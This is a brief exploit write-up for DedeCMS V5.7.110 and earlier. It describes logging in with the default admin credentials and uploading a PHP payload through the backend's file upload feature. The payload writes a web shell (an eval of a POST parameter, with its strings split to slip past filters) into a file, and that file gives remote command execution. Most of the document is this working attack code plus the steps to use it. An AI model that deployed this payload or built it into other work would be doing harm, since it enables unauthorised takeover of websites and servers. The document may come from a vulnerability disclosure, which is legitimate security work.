This version of dedecms<=DedeCMS V5.7.110

1. Use the default account password admin to log in to the backend. Currently, the latest version (August 15, 2023)
2. To remove system disabled functions
3. Upload Payload at the file upload location:
```php
<?php
$fp=fopen('data.php','w');
fwrite($fp,'<?php ');
fwrite($fp,'eva');
fwrite($fp,'l($_PO');
fwrite($fp,'ST[');
fwrite($fp,'shell])?>');
fclose($fp);
echo 'ok';
?>
```

4. Accessing Payload
5. A Trojan file will be generated in the directory to access executable commands

There is a detailed process in the usage details.pdf




